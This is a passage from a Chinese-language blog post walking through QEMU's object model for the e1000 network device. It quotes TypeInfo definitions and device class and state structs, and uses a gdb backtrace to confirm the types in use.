class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> <span class="type">const</span> TypeInfo device_type_info = &#123;</span><br><span class="line">    .name = TYPE_DEVICE,</span><br><span class="line">    .parent = TYPE_OBJECT,</span><br><span class="line">    .instance_size = <span class="keyword">sizeof</span>(DeviceState),</span><br><span class="line">    .instance_init = device_initfn,</span><br><span class="line">    .instance_post_init = device_post_init,</span><br><span class="line">    .instance_finalize = device_finalize,</span><br><span class="line">    .class_base_init = device_class_base_init,</span><br><span class="line">    .class_init = device_class_init,</span><br><span class="line">    .abstract = <span class="literal">true</span>,</span><br><span class="line">    .class_size = <span class="keyword">sizeof</span>(DeviceClass),</span><br><span class="line">    .interfaces = (InterfaceInfo[]) &#123;</span><br><span class="line">        &#123; TYPE_VMSTATE_IF &#125;,</span><br><span class="line">        &#123; TYPE_RESETTABLE_INTERFACE &#125;,</span><br><span class="line">        &#123; &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="type">static</span> <span class="type">const</span> TypeInfo pci_device_type_info = &#123;</span><br><span class="line">    .name = TYPE_PCI_DEVICE,</span><br><span class="line">    .parent = TYPE_DEVICE,</span><br><span class="line">    .instance_size = <span class="keyword">sizeof</span>(PCIDevice),</span><br><span class="line">    .abstract = <span class="literal">true</span>,</span><br><span class="line">    .class_size = <span class="keyword">sizeof</span>(PCIDeviceClass),</span><br><span class="line">    .class_init = pci_device_class_init,</span><br><span class="line">    .class_base_init = pci_device_class_base_init,</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="type">static</span> <span class="type">const</span> TypeInfo e1000_base_info = &#123;</span><br><span class="line">    .name          = TYPE_E1000_BASE,</span><br><span class="line">    .parent        = TYPE_PCI_DEVICE,</span><br><span class="line">    .instance_size = <span class="keyword">sizeof</span>(E1000State),</span><br><span class="line">    .instance_init = e1000_instance_init,</span><br><span class="line">    .class_size    = <span class="keyword">sizeof</span>(E1000BaseClass),</span><br><span class="line">    .abstract      = <span class="literal">true</span>,</span><br><span class="line">    .interfaces = (InterfaceInfo[]) &#123;</span><br><span class="line">        &#123; INTERFACE_CONVENTIONAL_PCI_DEVICE &#125;,</span><br><span class="line">        &#123; &#125;,</span><br><span class="line">    &#125;,</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="type">static</span> <span class="type">const</span> TypeInfo = &#123;</span><br><span class="line">    .name          = <span class="string">&quot;e1000&quot;</span>,</span><br><span class="line">    .parent        = TYPE_E1000_BASE,</span><br><span class="line">    .class_data    = &amp;e1000_devices[<span class="number">0</span>],</span><br><span class="line">    .class_init    = e1000_class_init,</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure></p><h3 id="数据结构-2"><a href="#数据结构-2" class="headerlink" title="数据结构"></a>数据结构</h3><p>可以看到，虽然<strong>e1000</strong>的Typeinfo信息很少，没有指明对应的类和对象的数据结构。但<strong>QOM</strong>会在初始化类时将父类的相关信息填充到当前的<strong>TypeImpl</strong>中，如下所示<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> <span class="type">size_t</span> <span class="title function_">type_class_get_size</span><span class="params">(TypeImpl *ti)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">if</span> (ti-&gt;class_size) &#123;</span><br><span class="line">        <span class="keyword">return</span> ti-&gt;class_size;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (type_has_parent(ti)) &#123;</span><br><span class="line">        <span class="keyword">return</span> type_class_get_size(type_get_parent(ti));</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">sizeof</span>(ObjectClass);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">static</span> <span class="type">void</span> <span class="title function_">type_initialize</span><span class="params">(TypeImpl *ti)</span></span><br><span class="line">&#123;</span><br><span class="line">    ti-&gt;class_size = type_class_get_size(ti);</span><br><span class="line">    ...</span><br><span class="line">    ti-&gt;<span class="class"><span class="keyword">class</span> =</span> g_malloc0(ti-&gt;class_size);</span><br><span class="line">    ...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>因此，实际上<strong>e1000</strong>就是在使用<strong>e1000_base_info</strong>中说明的<a href="https://elixir.bootlin.com/qemu/v9.0.0-rc2/source/hw/net/e1000.c#L80"><strong>E1000State</strong></a>和<a href="https://elixir.bootlin.com/qemu/v9.0.0-rc2/source/hw/net/e1000.c#L146"><strong>E1000BaseClass</strong></a>来表征<strong>e1000</strong>，如下的gdb结果也证实了<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//pwndbg&gt; bt</span></span><br><span class="line"><span class="comment">//#0  e1000_instance_init (obj=0x7ffff587d010) at ../../qemu/hw/net/e1000.c:1723</span></span><br><span class="line"><span class="comment">//#1  0x0000555555ea30e0 in object_init_with_type (obj=0x7ffff587d010, ti=0x55555709bc20) at ../../qemu/qom/object.c:429</span></span><br><span class="line"><span class="comment">//#2  0x0000555555ea30c2 in object_init_with_type (obj=0x7ffff587d010, ti=0x55555709be00) at ../../qemu/qom/object.c:425</span></span><br><span class="line"><span class="comment">//#3  0x0000555555ea36a6 in object_initialize_with_type (obj=0x7ffff587d010, size=208592, type=0x55555709be00) at ../../qemu/qom/object.c:571</span></span><br><span class="line"><span class="comment">//#4  0x0000555555ea3e75 in object_new_with_type (type=0x55555709be00) at ../../qemu/qom/object.c:791</span></span><br><span class="line"><span class="comment">//#5  0x0000555555ea3eb1 in object_new_with_class (klass=0x5555572bc2d0) at ../../qemu/qom/object.c:799</span></span><br><span class="line"><span class="comment">//#6  0x0000555555c3d234 in qemu_get_nic_models (device_type=0x55555623a47a &quot;pci-device&quot;) at ../../qemu/net/net.c:968</span></span><br><span class="line"><span class="comment">//#7  0x0000555555c3db78 in qemu_create_nic_bus_devices (bus=0x5555574157d0, parent_type=0x55555623a47a &quot;pci-device&quot;, default_model=0x5555562ab765 &quot;e1000&quot;, alias=0x55555623b21d &quot;virtio&quot;, alias_target=0x55555623b20e &quot;virtio-net-pci&quot;) at ../../qemu/net/net.c:1188</span></span><br><span class="line"><span class="comment">//#8  0x0000555555a9a0da in pci_init_nic_devices (bus=0x5555574157d0, default_model=0x5555562ab765 &quot;e1000&quot;) at ../../qemu/hw/pci/pci.c:1861</span></span><br><span class="line"><span class="comment">//#9  0x0000555555cd3d69 in pc_nic_init (pcmc=0x5555572bb030, isa_bus=0x555557163a00, pci_bus=0x5555574157d0) at ../../qemu/hw/i386/pc.c:1283</span></span><br><span class="line"><span class="comment">//#10 0x0000555555cb2ed4 in pc_init1 (machine=0x555557357800, pci_type=0x5555562ab7db &quot;i440FX&quot;) at ../../qemu/hw/i386/pc_piix.c:323</span></span><br><span class="line"><span class="comment">//#11 0x0000555555cb35e3 in pc_init_v9_0 (machine=0x555557357800) at ../../qemu/hw/i386/pc_piix.c:523</span></span><br><span class="line"><span class="comment">//#12 0x000055555595f8be in machine_run_board_init (machine=0x555557357800, mem_path=0x0, errp=0x7fffffffd820) at ../../qemu/hw/core/machine.c:1547</span></span><br><span class="line"><span class="comment">//#13 0x0000555555bdbc78 in qemu_init_board () at ../../qemu/system/vl.c:2613</span></span><br><span class="line"><span class="comment">//#14 0x0000555555bdbf87 in qmp_x_exit_preconfig (errp=0x555557061f60 &lt;error_fatal&gt;) at ../../qemu/system/vl.c:2705</span></span><br><span class="line"><span class="comment">//#15 0x0000555555bde944 in qemu_init (argc=35, argv=0x7fffffffdb58) at ../../qemu/system/vl.c:3739</span></span><br><span class="line"><span class="comment">//#16 0x0000555555e96f93 in main (argc=35, argv=0x7fffffffdb58) at ../../qemu/system/main.c:47</span></span><br><span class="line"><span class="comment">//#17 0x00007ffff7829d90 in __libc_start_call_main (main=main@entry=0x555555e96f6f &lt;main&gt;, argc=argc@entry=35, argv=argv@entry=0x7fffffffdb58) at ../sysdeps/nptl/libc_start_call_main.h:58</span></span><br><span class="line"><span class="comment">//#18 0x00007ffff7829e40 in __libc_start_main_impl (main=0x555555e96f6f &lt;main&gt;, argc=35, argv=0x7fffffffdb58, init=&lt;optimized out&gt;, fini=&lt;optimized out&gt;, rtld_fini=&lt;optimized out&gt;, stack_end=0x7fffffffdb48) at ../csu/libc-start.c:392</span></span><br><span class="line"><span class="comment">//#19 0x000055555586cc95 in _start ()</span></span><br><span class="line"><span class="comment">//pwndbg&gt; p *ti</span></span><br><span class="line"><span class="comment">//$8 = &#123;</span></span><br><span class="line"><span class="comment">//  name = 0x55555709bf80 &quot;e1000&quot;,</span></span><br><span class="line"><span class="comment">//  class_size = 240,</span></span><br><span class="line"><span class="comment">//  instance_size = 208592,</span></span><br><span class="line"><span class="comment">//  instance_align = 0,</span></span><br><span class="line"><span class="comment">//  class_init = 0x555555a0fa01 &lt;e1000_class_init&gt;,</span></span><br><span class="line"><span class="comment">//  class_base_init = 0x0,</span></span><br><span class="line"><span class="comment">//  class_data = 0x555556dfa700 &lt;e1000_devices&gt;,</span></span><br><span class="line"><span class="comment">//  instance_init = 0x0,</span></span><br><span class="line"><span class="comment">//  instance_post_init = 0x0,</span></span><br><span class="line"><span class="comment">//  instance_finalize = 0x0,</span></span><br><span class="line"><span class="comment">//  abstract = false,</span></span><br><span class="line"><span class="comment">//  parent = 0x55555709bfa0 &quot;e1000-base&quot;,</span></span><br><span class="line"><span class="comment">//  parent_type = 0x55555709bc20,</span></span><br><span class="line"><span class="comment">//  class = 0x5555572bc2d0,</span></span><br><span class="line"><span class="comment">//  num_interfaces = 0,</span></span><br><span class="line"><span class="comment">//  interfaces = &#123;&#123;</span></span><br><span class="line"><span class="comment">//      typename = 0x0</span></span><br><span class="line"><span class="comment">//    &#125; &lt;repeats 32 times&gt;&#125;</span></span><br><span class="line"><span class="comment">//&#125;</span></span><br><span class="line"><span class="comment">//pwndbg&gt; p sizeof(E1000State)</span></span><br><span class="line"><span class="comment">//$9 = 208592</span></span><br><span class="line"><span class="comment">//pwndbg&gt; p sizeof(E1000BaseClass)</span></span><br><span class="line"><span class="comment">//$10 = 240</span></span><br></pre></td></tr></table></figure></p><h4 id="E1000BaseClass"><a href="#E1000BaseClass" class="headerlink" title="E1000BaseClass"></a>E1000BaseClass</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * struct DeviceClass - The base class for all devices.</span></span><br><span class="line"><span class="comment"> * @props: Properties accessing state fields.</span></span><br><span class="line"><span class="comment"> * @realize: Callback function invoked when the #DeviceState:realized</span></span><br><span class="line"><span class="comment"> * property is changed to %true.</span></span><br><span class="line"><span class="comment"> * @unrealize: Callback function invoked when the #DeviceState:realized</span></span><br><span class="line"><span class="comment"> * property is changed to %false.</span></span><br><span class="line"><span class="comment"> * @hotpluggable: indicates if #DeviceClass is hotpluggable, available</span></span><br><span class="line"><span class="comment"> * as readonly &quot;hotpluggable&quot; property of #DeviceState instance</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">DeviceClass</span> &#123;</span></span><br><span class="line">    <span class="comment">/* private: */</span></span><br><span class="line">    ObjectClass parent_class;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* public: */</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * @categories: device categories device belongs to</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    DECLARE_BITMAP(categories, DEVICE_CATEGORY_MAX);</span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * @fw_name: name used to identify device to firmware interfaces</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="type">const</span> <span class="type">char</span> *fw_name;</span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * @desc: human readable description of device</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="type">const</span> <span class="type">char</span> *desc;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * @props_: properties associated with device, should only be</span></span><br><span class="line"><span class="comment">     * assigned by using device_class_set_props(). The underscore</span></span><br><span class="line"><span class="comment">     * ensures a compile-time error if someone attempts to assign</span></span><br><span class="line"><span class="comment">     * dc-&gt;props directly.</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    Property *props_;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * @user_creatable: Can user instantiate with -device / device_add?</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     * All devices should support instantiation with device_add, and</span></span><br><span class="line"><span class="comment">     * this flag should not exist.  But we&#x27;re not there, yet.  Some</span></span><br><span class="line"><span class="comment">     * devices fail to instantiate with cryptic error messages.</span></span><br><span class="line"><span class="comment">     * Others instantiate, but don&#x27;t work.  Exposing users to such</span></span><br><span class="line"><span class="comment">     * behavior would be cruel; clearing this flag will protect them.</span></span><br><span class="line"><span class="comment">     * It should never be cleared without a comment explaining why it</span></span><br><span class="line"><span class="comment">     * is cleared.</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     * TODO remove once we&#x27;re there</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="type">bool</span> user_creatable;</span><br><span class="line">    <span class="type">bool</span> hotpluggable;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* callbacks */</span></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * @reset: deprecated device reset method pointer</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     * Modern code should use the ResettableClass interface to</span></span><br><span class="line"><span class="comment">     * implement a multi-phase reset.</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     * <span class="doctag">TODO:</span> remove once every reset callback is unused</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    DeviceReset reset;</span><br><span class="line">    DeviceRealize realize;</span><br><span class="line">    DeviceUnrealize unrealize;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * @vmsd: device state serialisation description for</span></span><br><span class="line"><span class="comment">     * migration/save/restore</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="type">const</span> VMStateDescription *vmsd;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * @bus_type: bus type</span></span><br><span class="line"><span class="comment">     * private: to qdev / bus.</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="type">const</span> <span class="type">char</span> *bus_type;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">PCIDeviceClass</span> &#123;</span></span><br><span class="line">    DeviceClass parent_class;</span><br><span class="line"></span><br><span class="line">    <span class="type">void</span> (*realize)(PCIDevice *dev, Error **errp);</span><br><span class="line">    PCIUnregisterFunc *<span class="built_in">exit</span>;</span><br><span class="line">    PCIConfigReadFunc *config_read;</span><br><span class="line">    PCIConfigWriteFunc *config_write;</span><br><span class="line"></span><br><span class="line">    <span class="type">uint16_t</span> vendor_id;</span><br><span class="line">    <span class="type">uint16_t</span> device_id;</span><br><span class="line">    <span class="type">uint8_t</span> revision;</span><br><span class="line">    <span class="type">uint16_t</span> class_id;</span><br><span class="line">    <span class="type">uint16_t</span> subsystem_vendor_id;       <span class="comment">/* only for header type = 0 */</span></span><br><span class="line">    <span class="type">uint16_t</span> subsystem_id;              <span class="comment">/* only for header type = 0 */</span></span><br><span class="line"></span><br><span class="line">    <span class="type">const</span> <span class="type">char</span> *romfile;                <span class="comment">/* rom bar */</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">E1000BaseClass</span> &#123;</span></span><br><span class="line">    PCIDeviceClass parent_class;</span><br><span class="line">    <span class="type">uint16_t</span> phy_id2;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>这里除了父类外，没有太多与<strong>PCI设备</strong>相关的内容。</p><h4 id="E1000State"><a href="#E1000State" class="headerlink" title="E1000State"></a>E1000State</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * struct DeviceState - common device state, accessed with qdev helpers</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * This structure should not be accessed directly.  We declare it here</span></span><br><span class="line"><span class="comment"> * so that it can be embedded in individual device state structures.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">DeviceState</span> &#123;</span></span><br><span class="line">    <span class="comment">/* private: */</span></span><br><span class="line">    Object parent_obj;</span><br><span class="line">    <span class="comment">/* public: */</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * @id: global device id</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="type">char</span> *id;</span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * @canonical_path: canonical path of realized device in the QOM tree</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="type">char</span> *canonical_path;</span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * @realized: has device been realized?</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="type">bool</span> realized;</span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * @pending_deleted_event: track pending deletion events during unplug</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="type">bool</span> pending_deleted_event;</span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * @pending_deleted_expires_ms: optional timeout for deletion events</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="type">int64_t</span> pending_deleted_expires_ms;</span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * @opts: QDict of options for the device</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    QDict *opts;</span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * @hotplugged: was device added after PHASE_MACHINE_READY?</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="type">int</span> hotplugged;</span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * @allow_unplug_during_migration: can device be unplugged during migration</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="type">bool</span> allow_unplug_during_migration;</span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * @parent_bus: bus this device belongs to</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    BusState *parent_bus;</span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * @gpios: QLIST of named GPIOs the device provides.</span></span><br><span 